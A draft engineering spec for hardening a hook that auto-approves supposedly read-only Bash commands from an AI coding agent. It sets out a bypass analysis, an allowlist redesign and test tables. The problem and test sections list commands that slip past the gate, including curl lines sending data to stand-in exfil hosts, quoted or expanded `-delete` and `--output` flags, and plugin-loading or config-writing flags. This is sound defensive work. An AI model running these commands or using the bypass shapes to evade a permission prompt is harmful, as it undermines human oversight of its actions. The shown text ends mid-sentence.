# SPEC-340: permission-auto-approve stops silently approving writes

Status: DRAFT
Lane: full
Type: bug-fix / behavioral
Board: -

## Problem

`hooks/permission-auto-approve.sh` auto-approves a Bash command it believes is read-only, so
Claude Code skips the normal permission prompt. The approval logic is denylist-shaped: it
rejects a short list of known-dangerous shell metacharacters, then approves anything whose
command TEXT matches a whitelist regex. A denylist only stops the danger someone already
thought of. Reading the hook found four ways a write slips through the regex, all reproduced
live by piping the hook's own PermissionRequest JSON shape to it on stdin (the hook never
executes the command, it only decides; no file was actually touched):

| # | Command | Why it slips through | Recorded output |
|---|---|---|---|
| 1 | `echo x >/tmp/f` | Line 41's chain/redirect guard is `>\s\|>>`, a `>` followed by whitespace or a doubled `>>`. A `>` glued directly to the target path (no space) matches neither, so the command reaches the `^echo\b` whitelist entry and is approved as if it only printed to stdout. | `{"hookSpecificOutput":{"hookEventName":"PermissionRequest","decision":{"behavior":"allow"}}}` |
| 2 | `find /tmp -name *.tmp -delete` | The whitelist entry is `^find\b.*-name\b`: it only checks that `-name` appears somewhere in the command, and imposes no constraint on any other token. `-delete` (or `-exec`, `-fprintf`, ...) can sit right next to `-name` and still match. | same `"allow"` shape |
| 3 | `git log --output=/tmp/paa-test-log` | The whitelist entry is `^git\s+(status\|log\|diff\|branch\|show\|remote\|tag)`: it anchors on the subcommand word only and never looks at the flags that follow. `log`, `diff`, and `show` all share git's diff-formatting machinery, which accepts `--output=<file>` and writes there. | same `"allow"` shape |
| 4 | `git status\ncurl -s http://example.invalid/exfil` | `grep -qE` (both the chain/redirect guard and the whitelist loop) matches per LINE, not per whole string, because `CMD` is fed to `grep` unquoted through a pipe that never disables its default line-oriented behavior. A newline is not in the guard's character class, so it is not rejected at line 41, and the first line alone (`git status`) satisfies the whitelist test even though a second, completely unrelated command rides along in the same `tool_input.command` string. | same `"allow"` shape |

The same read-and-probe pass found three more instances of the identical root cause (a
regex that checks presence, not exclusivity), listed here because the fix in ## Contract closes
all of them, not just the four the task named:

| Command | Why it slips through | Recorded output |
|---|---|---|
| `ls & curl http://example.invalid/exfil` | The chain guard's `\&\&` requires a DOUBLE ampersand; a single `&` (background execution) is not in the character class at all. | `"allow"` |
| `cat </etc/hosts` | The chain guard checks `>` (output redirect) but has no entry for `<` (input redirect / process substitution). Not a write by itself, but it is a redirection operator the guard's own header claims to block, and `<()` process substitution can smuggle a subshell through it. | `"allow"` |
| `git branch newbranch` / `git tag v9.9.9` / `git remote add evil <url>` | Same subcommand-only anchor as case 3. `git branch <name>` creates a branch, `git tag <name>` creates a tag, `git remote add` writes a new remote into `.git/config`; none of these are read operations, and none are excluded by a regex that only checks the subcommand word. | `"allow"` |

A validation pass on the first draft of ## Contract then found two more classes of the same
root cause, this time inside the proposed fix itself rather than the shipped hook:

| # | Command | Why it slips through the DRAFT contract |
|---|---|---|
| 5 | `find /tmp -name x "-delete"`, `find /tmp -name x \-delete`, `find /tmp -name x ${NOPE:--delete}`, `find /tmp -name x {-delete,}`, `find /tmp -name x $'\x2ddelete'`, `git log '--output=/tmp/x'`, `ruff check "--fix"` | The draft Stage B banned a fixed list of characters but still allowed `"`, `'`, `\`, `$`, and `{}`. Its Stage F only inspected tokens whose text starts with `-`, but quote removal, backslash escapes, parameter expansion, brace expansion, and ANSI-C quoting each rebuild a leading `-` at run time, after the scan has already passed the token. Every form above reaches the program as a live write flag. |
| 6 | `go env -w X=y`, `go list -toolexec=cmd`, `ruff check --fix-only`, `ruff check --add-noqa`, `ruff check --output-file=f`, `npx prettier --check --plugin=./x.js`, `file -C -m m` | The draft gave `go`, `ruff`, and `npx` a flag denylist or unrestricted trailing flags. `go env -w` writes persistent Go config, `-toolexec=` names a program to run, the three ruff flags all write, `--plugin=` loads arbitrary JS, and `file -C` compiles a `.mgc` file. `file` had been classified "no write-capable option", which is false. |
| 7 | `find . -name *`, `git log *`, `ruff check *` | A bare `*` in a gated tool's arguments glob-expands against the current directory. A checked-in file literally named `-delete`, `--fix`, or `--output` lands in flag position at run time, the one expansion a character allowlist still permits. |

Baseline (unchanged by the fix, confirmed live): `git status`, `git log --oneline -5`, and
`ls -la` all return the same `"allow"` shape today. These three anchor the must-still-approve
group in ## Test plan.

`tests/test-hooks.sh` (the `=== permission-auto-approve.sh ===` block and the cosmetic-module
block) tests the hook's SECURITY GATE (pipe/chain rejection) and its cosmetic never-blocks
contract, but has no case for any of the shapes above: none of them are chained, piped, or
malformed JSON, so the existing suite is silent on them by construction, not by having tried
and passed.

## Design

**Goal:** the hook approves a command only when it can positively confirm the command is a
single, simple, read-only invocation. Anything it cannot positively confirm returns no decision,
so Claude Code shows the normal permission prompt. The hook never denies; ## Contract keeps that
invariant (`tests/test-hooks.sh`'s existing cosmetic-module block already pins "no cosmetic hook
contains a block/deny emitter" by grepping the source, and this fix adds no deny branch).

**Allowlist over denylist, stated once, applies everywhere below.** A denylist has to name every
dangerous shape in advance; anything the author did not think of is approved by default until
someone notices. That is exactly the shape of every bug above: `>` without a following space, a
single `&`, `<`, a subcommand-only git check, a presence-only `find` check, a quote the scan
could not see, a per-tool flag the denylist did not enumerate. An allowlist inverts the default:
a command, flag, character, or shape that was never positively confirmed safe is excluded, not
included, so a write vector nobody has thought of yet still falls through to the normal prompt
instead of being silently approved. The inversion is applied at three levels: the character set
the command may contain (Stage B), the tools the hook will consider (Stages D and E), and the
flags each gated tool may carry (Stage F). The cost is real (fewer commands auto-approve, more
prompts show) and it is the correct trade for a hook whose entire job is deciding what to
approve WITHOUT asking a human.

**Executing shell, stated once.** Commands approved here run under the harness's non-interactive
bash, which follows POSIX expansion rules: quote removal, backslash escapes, `$VAR`/`${..}`
expansion, brace expansion, ANSI-C quoting, command substitution, tilde expansion, globbing.
Stage B's character allowlist exists precisely so that after it passes, the token stream bash
will build from `CMD` equals the `WORDS[]` the hook scanned. Two expansions survive the
allowlist and are handled on purpose: `~` (expands only to paths, never to a `-`-token) and `*`
(handled per-tool at Stage F; see its rule). A runtime that executes Bash-tool commands under a
different shell grammar needs its own review of the character set; recorded in ## Failure modes.

### Rejected alternatives

| Approach | Why not |
|---|---|
| Patch the four known regexes in place (require whitespace before `>`, add `-delete` to a "bad flags" denylist for `find`, add `--output` to a denylist for `git log/diff/show`, treat `\n` as a chain operator) | Fixes exactly the four reported shapes and nothing else. The additional shapes found by reading the same code with the same lens (`&`, `<`, `git branch/tag/remote` mutation, quoting, per-tool flags) prove the class is bigger than the four named cases; patching case-by-case just continues the denylist's whack-a-mole pattern that created the bug in the first place. |
| Full shell grammar parser (proper tokenizer with quote-awareness, here-doc detection, brace expansion, glob resolution) | Correct in the limit but far past what "single, simple, read-only invocation" needs, and a bigger parser is a bigger place for the next false-approve to hide. `safety-gate.sh` already carries a heavier parser for a different, harder job (finding dangerous ops buried inside compound commands); this hook's job is narrower, it should refuse anything compound outright rather than understand it. |
| Keep the regex-whitelist shape but require every regex to end in `$` (anchor both ends) | Closes the git-subcommand-only and find-presence-only gaps for the SPECIFIC patterns rewritten, but a `$`-anchored regex still cannot express "no `-delete` token anywhere among these args" without turning into the same per-flag enumeration this spec ends up doing anyway. Anchoring is necessary but not sufficient, so the fix goes straight to explicit flag lists rather than a halfway regex patch that still needs a second pass. |
| Keep the character denylist but add the newly found smuggle characters to it (`"`, `'`, `\`, `$`, `{`, `}`) | The validation pass is the proof that this list never stays complete: it found five characters the first draft missed, and a sixth idea (history expansion `!`, `^` substitution, `[` globbing) would be next. The character set a command is allowed to contain is enumerable and small; the set of characters that can hurt is not. An allowlist is strictly easier to audit here. |
| Unquote/unescape tokens before the Stage F scan instead of banning the metacharacters | Re-implementing bash's expansion rules inside a bash hook is exactly the partial-parser shape rejected above, and every unhandled expansion reintroduces the same bug. Banning the characters is simpler and the failure mode is only an extra prompt. |
| **Chosen: single-line + character allowlist gate, then a first-word allowlist, then an explicit safe-flag allowlist for every tool that has a write-capable option** | Directly implements "positively confirm read-only." Each stage is independently simple to read and to test; a character absent from Stage B, a tool absent from the first-word lists, or a flag absent from its safe-flag list is excluded by construction rather than by someone remembering to add it to a denylist. |

## Picture

```
 stdin JSON {tool_name, tool_input.command}
        |
        v
 TOOL in {Read,Glob,Grep,WebSearch,WebFetch}? --yes--> allow        (unchanged)
        |no
        v
 TOOL == Bash and CMD non-empty?  --no--> no decision (fall through)
        |yes
        v
 STAGE A: CMD contains a newline?             --yes--> no decision   [case 4]
        |no                                    (subsumed by B; kept
        v                                       for readable failure)
 STAGE B: every char of CMD is in the ASCII allowlist
          [A-Za-z0-9 ._/=:,@%+*~-] ?           --no-->  no decision
        |yes                                   [cases 1-3, 5: quotes,
        v                                       \, $, {}, ;&|<>`()[]?,
 STAGE C: split CMD on whitespace into WORDS[]  #!^ tab non-ASCII die]
        |
        v
 STAGE D: WORDS[0] on the "no write-capable option" list
          (ls, cat, head, tail, wc, echo, which, type,
           stat, du, df, grep)?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE D: WORDS[0] is "pwd" and WORDS has length 1?
        |yes --------------------------------------------> allow
        |no
        v
 STAGE E: WORDS[0] is a GATED tool (find, git, npm, npx,
          go, ruff, file)?
        |no ---------------------------------------------> no decision
        |yes
        v
 STAGE F: WORDS[1] is an allowed subcommand AND no arg
          token contains "*" AND every token starting with
          "-" is in that tool's explicit safe-flag set?    [cases 2, 3,
        |no --------------------------------------------->    5, 6, 7]
        |    no decision
        |yes
        v
      allow
```

## Contract

Every check below runs in the order shown; the first failing check falls through to no decision
(the normal prompt). Nothing in this hook ever emits a deny/block decision (unchanged
invariant). The stale header comment at the top of the hook (the "SECURITY: Rejects any command
containing pipe operators" lines) is rewritten to describe this contract, one line per stage,
with Stage B named as a character allowlist.

**Stage A, single line.** `CMD` must not contain a newline (`$'\n'`). Redundant once Stage B
lands (a newline is not in the character allowlist) but kept as its own stage so a multi-line
command fails for the stated reason. Closes case 4.

**Stage B, character allowlist over the WHOLE string.** `CMD` must match
`^[A-Za-z0-9 ._/=:,@%+*~-]+$`: every character is an ASCII letter, digit, space, or one of
`._/=:,@%+*~-`. Everything else falls through: `"`, `'`, `\`, `` ` ``, `$`, `{`, `}`, `(`, `)`;
`&`, `|`, `<`, `>`, `?`, `[`, `]`, `#`, `!`, `^`, tab, and every non-ASCII byte. This replaces
the old character denylist. A denylist can only name the escapes somebody remembered, and the
validation pass found five characters the draft missed, each of which rebuilds a `-`-flag at
run time after Stage F has already scanned the token. With the allowlist, a literal `-` in the
command text is the only way a `-` reaches the program: no quote removal, backslash escape,
parameter expansion, brace expansion, ANSI-C quoting, or command substitution survives to run
time. The ASCII-only bound also kills lookalike characters (a Unicode minus in place of `-`)
for free. Closes cases 1 and 5 and the whole smuggle class.

**Stage C, tokenize.** Split `CMD` on whitespace into `WORDS[]`. This split is exact, not
heuristic: Stage B already removed every quote and escape character, so no token can hide a
leading `-` behind `"`, `'`, or `\`, and none can expand into one at run time.

**Stage D, commands with no write-capable option (first word decides, no further check):**

| Command | Notes |
|---|---|
| `ls`, `cat`, `head`, `tail`, `wc`, `echo`, `which`, `type`, `stat`, `du`, `df`, `grep` | Admission criterion, verified per tool: no flag writes to the filesystem or runs another program, so trailing flags are unrestricted and a glob-expanded filename can only ever become a harmless flag. `file` fails the criterion (`-C` writes a compiled magic file) and moved to Stage E. `printenv` was dropped, see ## Decision Log. |
| `pwd` | Exact match, zero further tokens. `env` lost its former zero-arg seat by the same Decision Log entry. |
| `git status`, `git ls-files` | Exact two-word match at `WORDS[0..1]`; neither subcommand has a write-capable flag, so trailing flags are unrestricted. |
| `node --version`, `python3 --version`, `cargo --version` | Exact match, `WORDS[0..1]` only, nothing after. |

**Stage E/F, gated tools (explicit safe subcommand/flag allowlist required).** Two rules apply
to every gated tool's `WORDS[1:]` before the per-tool table below:

1. A token containing `*` falls through. After Stage B, globbing is the only expansion that can
   still manufacture a `-`-token the scan never saw: an unquoted `*` expands against the current
   directory, where a checked-in file literally named `-delete`, `--fix`, or `--output` lands in
   flag position. Closes case 7. (Stage D tools keep `*`; their admission criterion makes a
   planted flag harmless.)
2. Every token starting with `-` must appear in the tool's safe-flag set, where a "safe flag"
   entry is a literal flag or a `name=` prefix as listed. Anything else falls through by
   omission, not by being named.

| Tool | Rule |
|---|---|
| `find` | Every `-`-prefixed token in `WORDS[1:]` must be one of: `-name`, `-iname`, `-path`, `-ipath`, `-type`, `-maxdepth`, `-mindepth`, `-print`, `-print0`. `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fprintf`, `-fls`, and everything unlisted fall through. Non-flag tokens (search paths, literal patterns) are unrestricted. Closes case 2. |
| `git` `log`/`diff`/`show` | `WORDS[1]` in `{log, diff, show}`. Every `-`-prefixed token must be one of: `--oneline`, `--graph`, `--all`, `--stat`, `--name-only`, `--name-status`, `-p`, `--patch`, `--no-merges`, `--merges`, `--reverse`, `--cached`, `--staged`, `-n`, `--`, or match `^-[0-9]+$` (e.g. `-5`), or start with one of the prefixes `--format=`, `--pretty=`, `--since=`, `--until=`, `--author=`, `--grep=`, `--max-count=`. `--output` and any other unlisted flag are excluded by omission. `git` global flags (`-c`, `-C`, `--exec-path`, `--git-dir`) are not on the list, so `git -c core.pager=x log` falls through. Closes case 3. |
| `git branch` | `WORDS[1] == "branch"`. Zero non-flag tokens allowed (no branch-name argument, which is what creates a branch). Any `-`-prefixed token must be one of `-v`, `-vv`, `-a`, `-r`, `--list`, `--show-current`. Closes the `git branch newbranch` case. |
| `git remote` | `WORDS[1] == "remote"`. Zero or one further token; if present it must be exactly `-v`, `--verbose`, or `show`. `add`/`remove`/`rename`/`set-url`/`set-branches`/`set-head`/`prune` are excluded by omission. |
| `git tag` | `WORDS[1] == "tag"`. Zero non-flag tokens allowed (no tag-name argument, which is what creates a tag). Any `-`-prefixed token must be one of `-l`, `--list`, or match `^-n[0-9]*$`. `-d`, `-a`, `-f`, `-s`, `-m` are excluded by omission. |
| `npm` | `WORDS[1]` in `{list, ls, outdated, view}`. Trailing flags unrestricted: verified that none of these four subcommands has a write-capable or exec-capable flag. The `*` ban still applies. |
| `npx` | `WORDS[1] == "prettier"`, `--check` appears among `WORDS[2:]`, and every `-`-prefixed token in `WORDS[2:]` is one of `--check`, `--ignore-unknown`, `--no-error-on-unmatched-pattern` or starts with `--config=` or `--ignore-path=`. `--plugin=` (loads arbitrary JS) is excluded by omission, and `npx -y`/`-p`/`--yes` can never appear because `WORDS[1]` must be `prettier`. |
| `go` | `WORDS[1] == "version"`: flags only from `{-m, -v}`. `WORDS[1] == "env"`: flags only from `{-json, -changed}` and non-flag tokens unrestricted (variable names); `-w` (writes persistent config) and `-u` (unsets it) excluded. `WORDS[1] == "list"`: flags only from `{-e, -f, -json, -m, -deps, -test, -u}`; `-toolexec=` (names a program to run) and `-export` excluded. Any other `WORDS[1]` falls through. |
| `ruff` | `WORDS[1] == "check"`. Every `-`-prefixed token must be one of `-v`, `-q`, `-s`, `--statistics`, `--diff`, `--isolated`, `--no-cache`, `--exit-zero`, `--exit-non-zero-on-fix`, `--preview`, `--no-preview`, `--respect-gitignore`, `--no-respect-gitignore`, `--force-exclude`, or start with one of the prefixes `--select=`, `--ignore=`, `--extend-select=`, `--extend-ignore=`, `--per-file-ignores=`, `--line-length=`, `--target-version=`, `--output-format=`, `--config=`. `--fix`, `--fix-only`, `--unsafe-fixes`, `--add-noqa`, `--output-file`, `--watch` are excluded by omission, as is every other ruff subcommand (`ruff format` rewrites files in place). |
| `file` | Every `-`-prefixed token must be one of `-b`, `--brief`, `-i`, `-s`, `-z`, `-L`, `-f`, `--mime`, `--mime-type`, `--mime-encoding`. `-C`/`--compile` (writes a compiled `.mgc` magic file) and `-m` are excluded by omission. |

`sed` and `sort` are named in the task brief as tools whose base command has write-capable
options (`sed -i`, `sort -o`). Neither appears anywhere in the current hook, so there is no
existing bypass to fix; ## Design's Rejected alternatives states the decision to leave them off
the allowlist entirely rather than add them as new capability. `tests/test-hooks.sh` gets one
must-not-approve case each (`sed -i s/a/b/ file`, `sort -o out.txt file`) proving they fall
through purely because Stage D/E never names them, not because of any sed/sort-specific logic,
plus a source-level grep test (AC5) pinning that neither word appears in the hook.

**Sed/sort, explicitly rejected as new scope:**

| Option | Why not |
|---|---|
| Add `sed`/`sort` to Stage D or E with flag-level filtering (`-i`/`-o` excluded, everything else allowed) | This is new auto-approval capability the current hook never had; the task is closing an existing over-approval, not growing the approved surface. Two more gated-tool flag tables cost real review surface for a benefit nobody asked for (YAGNI). If a future operator wants `sed`/`sort` auto-approved, that is a separate, explicitly-scoped follow-up, not a rider on a hardening fix. |
| **Chosen: leave `sed`/`sort` absent from every stage** | They already fall through to the normal prompt today (never matched any existing regex); this fix changes nothing about them, and a test pins that a write-capable form of each still falls through after the rewrite, so a future edit that accidentally adds a loose `^sed\b` or `^sort\b` entry is caught. |

## Task Breakdown

| Task | Files | Acceptance |
|---|---|---|
| T1 | `tests/test-hooks.sh` | Group (a)/(b) cases and the AC5 source grep land in the existing `=== permission-auto-approve.sh ===` block. Against the unpatched hook, every live-bypass case in group (a) goes red and every group (b) case stays green (the negative control table in ## Test plan). |
| T2 | `hooks/permission-auto-approve.sh` | Stage A-F rewrite per ## Contract, including the rewritten header comment. The full suite goes green. |
| T3 | `docs/FEATURES.md` | Regenerated via `bash lib/registry/feature-registry.sh generate`; the `permission-auto-approve.sh` row's Specs column picks up this spec. |

## Failure modes

| Class | Consequence | Why acceptable |
|---|---|---|
| A safe command uses a flag not yet on its tool's safe list (e.g. `git log --follow`) | Falls through to the normal prompt instead of auto-approving | The stated failure mode: never a false approve, only an extra prompt. The safe-flag lists can be extended later, named as a follow-up, without touching Stages A-C. |
| A safe command contains a banned character: a quote (`git log --format="%h %s"`, `find . -name '*.md'`), a backslash, a `$VAR`, a brace group, or any non-ASCII byte | Falls through to the normal prompt | These are exactly the smuggle characters: a quoted, escaped, or expanded `-flag` defeats any text-level leading-`-` check because bash restores the dash at run time. Banning them outright is what makes Stage F's "starts with `-`" test mean anything. The cost is an occasional prompt on a safe command. |
| An unquoted `*` in a Stage-D command (`ls *.md`, `cat *`) glob-expands to a filename the scan never saw, potentially one literally named like a flag | The planted name lands as a flag to a Stage-D tool | Stage D's admission criterion is "no flag on this tool writes or execs", verified per tool, so a planted flag-looking filename is harmless there. For gated tools `*` is banned outright (Stage F rule 1), so the same trick cannot reach find/git/ruff/etc. |
| Commands execute under the harness's non-interactive bash | Stage B's allowlist is derived from POSIX expansion rules | Recorded assumption: a runtime that executes Bash-tool commands under a different grammar (fish, PowerShell, cmd) needs its own review of the character set. Out of scope here. |
| `git log`/`diff`/`show`/`branch`/`tag` honor the local `.git/config` (`core.pager`, `pager.*`, `include.path`) | A crafted local pager config would run a program on an auto-approved read | `.git/config` is never checked into a repository, so writing it needs prior local file access, at which point code execution is already in hand. The hook cannot modify the command or its environment, it can only approve or abstain; the assumption is recorded, not mitigated. `git -c`/`-C` overrides fall through (not on the safe-flag list). |
| A genuinely malicious command built entirely from safe-looking tokens (an unlisted git subcommand, an unlisted tool) | Falls through | Stage E recognizes only the seven gated tools and their named subcommands; any subcommand outside `{status, ls-files, log, diff, show, branch, remote, tag}` for `git`, or any tool outside the Stage D/E tables entirely, never reaches an approve branch. Same "excluded by omission" property the whole design relies on. |

## Acceptance criteria

- AC1: every command in ## Problem's three tables (the four named cases, the three audit-found
  cases, and the validation-pass cases 5-7) returns no `"allow"` in its output after the fix.
  ## Test plan group (a) is the per-case enumeration of this AC.
- AC2: `git status`, `git log --oneline -5`, and `ls -la` (the pre-existing must-still-approve
  baseline, confirmed live in ## Problem) still return `"allow"` after the fix, along with the
  rest of ## Test plan group (b).
- AC3: the hook never emits a block/deny decision; `tests/test-hooks.sh`'s existing cosmetic-module
  grep assertion (source-level, no deny emitter) still passes unmodified.
- AC4: the hook still exits 0 on every one of the ten `COSMETIC_GARBAGE` malformed-JSON shapes
  already pinned in the cosmetic-module block (fail-closed, never crashes).
- AC5: `sed -i ...` and `sort -o ...` do not auto-approve, and neither `sed` nor `sort` appears
  as a word anywhere in the rewritten hook source (grep-checkable, pinned by a test).

## Test plan

New cases land in `tests/test-hooks.sh`'s existing `=== permission-auto-approve.sh ===` block,
same `OUTPUT=...; assert_output_not_contains "..." '"allow"' "$OUTPUT"` /
`assert_output_contains` shape already used there, plus one `assert_true` source grep for AC5.
No new test file.

**Group (a), must-not-approve (each asserts the output does NOT contain `"allow"`):**

| Case | Command | Closes |
|---|---|---|
| a1 | `echo x >/tmp/paa-test-f` | case 1 (unspaced `>`) |
| a2 | `find /tmp -name *.tmp -delete` | case 2 (`-delete` beside `-name`) |
| a3 | `git log --output=/tmp/paa-test-log` | case 3 (subcommand-only git check) |
| a4 | two-line command, `git status` then `curl -s http://example.invalid/exfil` (built via `printf` + `jq -Rs`, not a literal embedded newline in the test source) | case 4 (newline not a separator) |
| a5 | `ls & curl http://example.invalid/exfil` | single `&` gap |
| a6 | `cat </etc/hosts` | bare `<` gap |
| a7 | `git branch newbranch` | subcommand-only git check, branch-create |
| a8 | `git tag v9.9.9` | subcommand-only git check, tag-create |
| a9 | `git remote add evil http://example.invalid/repo.git` | subcommand-only git check, remote-add |
| a10 | `echo hi; curl http://example.invalid` | `;` metacharacter (already covered by the suite's `echo foo; curl evil.com` case; listed for completeness, not duplicated) |
| a11 | `ls \| curl http://example.invalid` | `\|` metacharacter (already covered by the `cat /etc/passwd \| curl evil.com` case; listed for completeness) |
| a12 | `echo $(curl http://example.invalid)` | `$(` metacharacter (already covered; listed for completeness) |
| a13 | `` echo `curl http://example.invalid` `` | backtick metacharacter |
| a14 | `(curl http://example.invalid)` | bare-parenthesis subshell |
| a15 | `sed -i s/a/b/ /tmp/paa-test-f` | sed excluded by omission |
| a16 | `sort -o /tmp/paa-test-f /tmp/paa-test-f` | sort excluded by omission |
| a17 | `find /tmp -name *.tmp -exec rm {} \;` | `-exec` beside `-name`; already rejected today, but only by accident (the literal `;` inside `\;` trips the pre-existing chain guard). Pinned so the rewrite blocks it for the deliberate reason (Stage F's `-exec` omission), not the accident. |
| a18 | `find /tmp -name x "-delete"` | case 5: quoted flag, bash restores the `-` |
| a19 | `find /tmp -name x \-delete` | case 5: backslash-escaped flag |
| a20 | `find /tmp -name x ${NOPE:--delete}` | case 5: parameter expansion restoring `-` |
| a21 | `find /tmp -name x {-delete,}` | case 5: brace expansion producing `-delete` |
| a22 | `find /tmp -name x $'\x2ddelete'` | case 5: ANSI-C quoted hex flag |
| a23 | `git log '--output=/tmp/paa-test-x'` | case 5: quoted write flag on a gated tool |
| a24 | `ruff check "--fix"` | case 5: quoted write flag on a gated tool |
| a25 | `go env -w GOFLAGS=-mod=mod` | case 6: `go env -w` writes persistent config |
| a26 | `go list -toolexec=echo` | case 6: `-toolexec=` names a program |
| a27 | `ruff check --fix-only` | case 6: writes fixes in place |
| a28 | `ruff check --add-noqa` | case 6: writes noqa comments into files |
| a29 | `ruff check --output-file=/tmp/paa-ruff.txt` | case 6: writes report to a file |
| a30 | `npx prettier --check --plugin=./evil.js` | case 6: plugin loads arbitrary JS |
| a31 | `file -C -m /tmp/paa-magic` | case 6: `-C` compiles, writes `.mgc` |
| a32 | `find . -name *` | case 7: bare glob in gated-tool args |
| a33 | `git log *` | case 7: bare glob in gated-tool args |
| a34 | `find . -name *.md` | case 7: the former group-(b) case, now must-not-approve because the pattern carries `*` |
| a35 | `cargo check` | dropped approval: writes `target/` and runs build scripts |
| a36 | `python --version` | dropped approval: only `python3` kept (this stack's interpreter) |
| a37 | `env` | dropped approval: dumps every env var, secrets included, with no prompt |
| a38 | `printenv` | dropped approval: same reason |
| a39 | `npx -y prettier --check` | `WORDS[1]` must be `prettier`; `npx -y` auto-confirms installs |

**Group (b), must-still-approve (each asserts the output DOES contain `"allow"`, guards against
"fixed by turning every read into a prompt"):**

| Case | Command | Exercises |
|---|---|---|
| b1 | `git status` (already asserted above; unchanged) | Stage D exact two-word |
| b2 | `git log --oneline -5` (already asserted above; unchanged) | Stage F flag set + `^-[0-9]+$` |
| b3 | `ls -la` (already asserted above; unchanged) | Stage D no-write-option tool |
| b4 | `cat README.md` | Stage D |
| b5 | `find . -name readme.md` | Stage F find flag set, literal pattern (was `*.md`; a bare `*` in gated args is now banned, see case 7) |
| b6 | `git diff --stat` | Stage F git flag set |
| b7 | `git branch -v` | Stage F git branch |
| b8 | `git remote -v` | Stage F git remote |
| b9 | `git tag -l` | Stage F git tag |
| b10 | `npm list` | Stage F npm |
| b11 | `pwd` | Stage D exact match |
| b12 | `ruff check .` | Stage F ruff, no flags |
| b13 | `npx prettier --check README.md` | Stage F npx |
| b14 | `file README.md` | Stage F file, no flags |
| b15 | `git log -n 5` | Stage F `-n` entry |
| b16 | `go env GOPATH` | Stage F go env, non-flag var name |
| b17 | `git log --format=%h` | Stage F `--format=` prefix; `=` and `%` are Stage-B-legal |

**Negative control, run and recorded.** Executed live against the pre-fix
`hooks/permission-auto-approve.sh` (this worktree, before Stage A-F lands) with the new test
cases in place. Result: 30 group-(a) assertions go red, every group (b) assertion stays green,
and six group-(a) assertions pass even pre-fix, each for a documented accidental reason rather
than by design:

| Pre-fix result | Cases | Why |
|---|---|---|
| Red (old hook emits `"allow"`) | a1-a9, a18-a38 | The live bypasses: a18-a24 match the old `^find\b.*-name\b`, `^git\s+...`, `^ruff\s+check` patterns once the text-level `-` is hidden; a25-a31 match `^go`, `^ruff`, `^npx`, `^file`; a32-a34 match `^find`/`^git`; a35-a38 match `^cargo`, `^python3?`, `^env$`, `^printenv`. |
| Green by accident | a13, a14, a15, a16, a17, a39 | a13: backtick was already in the old chain-guard class. a14: bare parens never matched any old prefix. a15/a16: `sed`/`sort` were never whitelisted. a17: caught only because the literal `;` inside `\;` trips the old guard, not because of `-exec`. a39: `npx -y` never matched `^npx\s+prettier`. |

a10-a12 are informational rows only (already covered by the suite's pre-existing
pipe/chain/subshell cases, not duplicated). Every group (a) case is kept as a pin regardless
of whether it already passed pre-fix, so the rewrite closes each one for the deliberate,
documented reason, not by continuing to rely on an accident of the old regex.

## Verification

`bash tests/test-hooks.sh` exits 0, permission-auto-approve section shows the new
group-(a)/group-(b) cases plus the AC5 source grep passing (`PASS` count increases by the
number of new assertions listed above, `FAIL` count 0). The negative control above run once,
live, during implementation (not part of the committed suite), confirming the live-bypass
portion of group (a) is red against the unpatched hook and all of it is green against the fix.

## Touches

- `hooks/permission-auto-approve.sh`: the Stage A-F rewrite plus the rewritten header comment
  (implementation, next lane phase). The new header describes the staged contract, one line
  per stage, Stage B named as a character allowlist.
- `tests/test-hooks.sh`: the group (a)/(b) cases and the AC5 source grep above, added to the
  existing `=== permission-auto-approve.sh ===` block.
- `docs/FEATURES.md`: regenerate via `bash lib/registry/feature-registry.sh generate` once this
  spec file exists, so the `permission-auto-approve.sh` row's Specs column picks up SPEC-340
  (the generator greps `docs/specs/SPEC-*.md` for the token `permission-auto-approve`; this spec
  mentions it throughout, so no extra marker is needed).
- `hooks/codex-hooks.json` / `lib/codex/repin.sh`: checked, not touched. Neither file references
  `permission-auto-approve.sh`; the sha256 pins in `codex-hooks.json` cover exactly five files
  (`codex-hook-adapter.sh`, `safety-gate.sh`, `ship-gate.sh`, `commit-format.sh`,
  `secrets-guard.sh`), confirmed by grep. `permission-auto-approve.sh` is not part of the Codex
  hard-guardrail spine, so this spec has nothing to repin.
- `hooks.json` / `settings.json` / `anchor-root.sh`: explicitly out of scope for this worktree
  (owned by another branch); not touched, not read for anything beyond the sha-pin check above.

## After state

`hooks/permission-auto-approve.sh` still auto-approves the everyday read-only commands it does
today (Group (b)), and no longer auto-approves any of the write/exfiltration shapes found in
## Problem: the four named cases, the three audit cases, the whole quote/escape/expansion
smuggle class, the per-tool write flags on `go`/`ruff`/`npx`/`file`, and glob-expanded planted
flags. `env`, `printenv`, `cargo check`, and `python --version` lose their auto-approval (see
## Decision Log); `file` moves to the gated set. The hook still never emits a deny decision; a
command it cannot positively confirm as read-only falls through to the normal Claude Code
permission prompt instead. `sed` and `sort` remain absent from the approved set, unchanged from
today's behavior, now with a regression test proving it stays that way.

Not covered:

- Extending the git `log`/`diff`/`show` safe-flag list to cover more read-only flags
  (`--follow` is the named example). An operator who hits a prompt for a flag they believe is
  safe can propose adding it to the Stage F table in a follow-up; the failure mode is an extra
  prompt, never a silent approval, so there is no urgency to enumerate every git flag up front.
- Re-admitting quoted arguments (`find . -name '*.md'`, `git log --format="%h %s"`). That needs
  a real quote/escape interpreter, the partial-parser shape rejected in ## Design. Possible
  follow-up with its own review; today a quote in the command means a prompt.
- Re-admitting `env`/`printenv` in some narrowed form (e.g. `printenv VAR` for a single named
  variable). A plausible follow-up if the prompts annoy; decided against for now in the
  Decision Log.
- Adding `sed`/`sort` (or any other tool) to the approved set. Explicitly rejected in ## Design;
  a separate, explicitly-scoped follow-up if ever wanted.

## Decision Log

- Chose a staged pipeline (single-line, then character allowlist, then tokenize, then
  first-word allowlist, then per-tool safe-flag allowlist) over patching the reported regexes
  in place, after the audit and the validation pass kept finding instances of the identical
  root cause; a denylist patch only ever closes the cases someone happened to name.
- Chose a character allowlist for Stage B over enlarging the character denylist, after the
  validation pass found five characters (`"`, `'`, `\`, `$`, `{}`) the draft's denylist missed,
  each able to rebuild a `-`-flag at run time. The safe character set is small and enumerable;
  the dangerous set is not.
- Chose to reject bare `(`/`)` outright rather than special-case `find`'s escaped-parenthesis
  grouping syntax, since none of the safe `find` flags this spec allows need it; simpler than
  teaching Stage B about escaped versus bare parens for one flag class nobody asked to keep.
  Moot under the character allowlist, which bans both parens anyway; kept for the record.
- Chose explicit per-subcommand flag allowlists for `go`, `ruff`, `npx`, and `file` over flag
  denylists or unrestricted trailing flags, after the validation pass showed each had a
